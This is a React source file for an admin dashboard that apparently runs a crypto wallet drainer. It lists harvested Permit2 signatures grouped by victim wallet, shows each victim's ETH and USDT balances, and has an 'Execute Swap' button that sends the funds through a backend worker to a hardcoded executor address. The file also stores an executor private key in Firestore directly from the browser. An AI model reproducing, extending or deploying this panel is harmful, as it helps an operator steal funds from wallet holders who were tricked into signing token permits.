import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
import { ethers } from 'ethers';

const BACKEND_URL = "/api/run-worker";
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  const [recipient, setRecipient] = useState(HARDCODED_EXECUTOR);
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");

  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [settingsLoading, setSettingsLoading] = useState(false);
  const [settingsStatus, setSettingsStatus] = useState("");
  const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
  const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  useEffect(() => {
    localStorage.setItem('admin_outputToken', outputToken);
  }, [outputToken]);

  const openSettings = async () => {
    setIsSettingsOpen(true);
    setSettingsLoading(true);
    try {
      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
      const s = snap.exists() ? snap.data() : {};

      const execVal = s.executorAddress || HARDCODED_EXECUTOR;
      const tokenVal = s.tokenAddress || outputToken;
      const privKeyVal = s.executorPrivateKey || '';

      setExecutorAddressSetting(execVal);
      setExecutorPrivateKeySetting(privKeyVal);
      setOutputToken(tokenVal);
      setSettingsStatus('Loaded');
    } catch (err) {
      setSettingsStatus('Load failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  const saveSettings = async () => {
    setSettingsLoading(true);
    setSettingsStatus('Saving...');
    try {
      await setDoc(docRef(db, 'admin_config', 'settings'), {
        executorAddress: executorAddressSetting,
        executorPrivateKey: executorPrivateKeySetting || undefined,
        tokenAddress: outputToken
      }, { merge: true });
      setSettingsStatus('Saved');
    } catch (err) {
      setSettingsStatus('Save failed');
    } finally {
      setSettingsLoading(false);
    }
  };

  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);

      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  const [balances, setBalances] = useState({});
  const [tokenBalances, setTokenBalances] = useState({});
  const [executorEthBalance, setExecutorEthBalance] = useState('—');
  const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
  const [tokenSymbol, setTokenSymbol] = useState('TOKEN');

  const DEFAULT_TOKEN = import.meta.env.VITE_USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const tokenAddress = outputToken || DEFAULT_TOKEN;
  const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function decimals() view returns (uint8)'
  ];
  const [tokenDecimals, setTokenDecimals] = useState(6);
  const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;

  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');

  useEffect(() => {
    let mounted = true;
    const owners = Object.keys(groupedData);
    if (!owners.length) {
      setBalances({});
      return;
    }

    (async () => {
      const next = {};
      const nextToken = {};
      let tokenContract;

      try {
        tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const dec = await tokenContract.decimals();
        setTokenDecimals(Number(dec));
      } catch (e) {}

      for (const owner of owners) {
        try {
          const b = await provider.getBalance(owner);
          next[owner] = parseFloat(ethers.formatEther(b)).toFixed(4);
        } catch {
          next[owner] = '—';
        }

        try {
          if (tokenContract) {
            const tb = await tokenContract.balanceOf(owner);
            nextToken[owner] = Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4);
          } else nextToken[owner] = '—';
        } catch {
          nextToken[owner] = '—';
        }
      }

      if (mounted) {
        setBalances(next);
        setTokenBalances(nextToken);
      }
    })();

    (async () => {
      try {
        const eb = await provider.getBalance(EXECUTOR_ADDRESS_UI);
        setExecutorEthBalance(parseFloat(ethers.formatEther(eb)).toFixed(4));
      } catch {
        setExecutorEthBalance('—');
      }
      try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const tb = await tokenContract.balanceOf(EXECUTOR_ADDRESS_UI);
        setExecutorTokenBalance(Number(ethers.formatUnits(tb, tokenDecimals)).toFixed(4));
      } catch {
        setExecutorTokenBalance('—');
      }
    })();

    return () => { mounted = false; };
  }, [groupedData]);

  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Processing...");

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient,
          outputToken
        })
      });

      const result = await response.json();

      if (!response.ok || !result.ok) throw new Error(result.error || "Execution failed");

      setStatusMsg("Success");
      setTimeout(() => setStatusMsg(""), 3000);

    } catch (err) {
      setStatusMsg("Error: " + err.message);
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="min-h-screen bg-gray-50 p-6">

      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <h1 className="text-2xl font-bold text-gray-800">Admin Dashboard</h1>
        <button
          onClick={openSettings}
          className="px-4 py-2 bg-gray-900 text-white rounded-md hover:bg-gray-700"
        >
          Settings
        </button>
      </div>

      {/* Settings Row */}
      <div className="mb-6 bg-white shadow p-5 rounded-lg border">
        <h2 className="text-lg font-semibold text-gray-700 mb-3">Global Settings</h2>
        <input
          className="w-full px-3 text-gray-700 py-2 border rounded-md"
          value={outputToken}
          onChange={(e) => setOutputToken(e.target.value)}
          placeholder="Output Token Address"
        />
      </div>

      {/* Wallets Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {Object.keys(groupedData).map(owner => (
          <div
            key={owner}
            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md"
            onClick={() => openModal(owner)}
          >
            <div className="font-mono text-gray-700 text-sm">
              {owner.slice(0, 6)}...{owner.slice(-4)}
            </div>

            <div className="mt-3 text-gray-900 font-bold">
              {balances[owner]} ETH • {tokenBalances[owner]} {tokenSymbol}
            </div>

            <div className="mt-4 flex justify-between text-sm text-gray-800">
              <div>Signatures</div>
              <div className="font-bold">{groupedData[owner].length}</div>
            </div>

            <div className="flex justify-between text-sm text-gray-800 mt-1">
              <div>Pending</div>
              <div className="font-bold text-yellow-600">
                {groupedData[owner].filter(x => !x.processed).length}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Modal */}
      {isModalOpen && selectedWallet && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-lg p-6 relative">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">
                {selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}
              </h3>
              <button
                onClick={() => setIsModalOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            {/* ALERT / STATUS BAR */}
            {statusMsg && (
              <div className={`
                  mb-4 px-4 py-2 rounded 
                  ${statusMsg.startsWith("Error") ? "bg-red-100 border border-red-300 text-red-800"
                    : statusMsg.startsWith("Success") ? "bg-green-100 border border-green-300 text-green-800"
                    : "bg-blue-100 border border-blue-300 text-blue-800"
                  }
              `}>
                {statusMsg}
              </div>
            )}

            <div className="space-y-4">
              {groupedData[selectedWallet].map(sig => (
                <div
                  key={sig.id}
                  className="border p-4 rounded-lg bg-gray-50"
                >
                  <div className="text-sm mb-1">Token: {sig.token.slice(0,6)}...{sig.token.slice(-4)}</div>
                  <div className="text-sm mb-3">
                    Amount: {(BigInt(sig.amount) / 10n**6n).toString()} USDT
                  </div>

                  {!sig.processed ? (
                    <button
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                      className="w-full bg-black text-white py-2 rounded hover:bg-gray-800 disabled:opacity-50"
                    >
                      {processingId === sig.id ? "Processing..." : "Execute Swap"}
                    </button>
                  ) : (
                    <a
                      href={`https://etherscan.io/tx/${sig.routerTx}`}
                      className="mt-2 block text-blue-600 underline"
                      target="_blank"
                      rel="noreferrer"
                    >
                      View on Etherscan →
                    </a>
                  )}
                </div>
              ))}
            </div>

          </div>
        </div>
      )}

      {/* Settings Modal */}
      {isSettingsOpen && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4 z-40">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 relative">

            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-semibold">Settings</h3>
              <button
                onClick={() => setIsSettingsOpen(false)}
                className="text-gray-500 hover:text-gray-800"
              >
                ✕
              </button>
            </div>

            <input
              value={executorAddressSetting}
              onChange={e => setExecutorAddressSetting(e.target.value)}
              className="w-full px-3 py-2 border mb-3 rounded"
              placeholder="Executor Address"
            />

            <input
              type="password"
              value={executorPrivateKeySetting}
              onChange={e => setExecutorPrivateKeySetting(e.target.value)}
              className="w-full px-3 py-2 border mb-3 rounded"
              placeholder="Executor Private Key"
            />

            <button
              onClick={saveSettings}
              disabled={settingsLoading}
              className="w-full py-2 bg-gray-900 text-white rounded hover:bg-gray-800 disabled:opacity-50"
            >
              {settingsLoading ? "Saving..." : "Save Settings"}
            </button>

            <div className="text-sm text-gray-500 mt-2">{settingsStatus}</div>
          </div>
        </div>
      )}

    </div>
  );
}
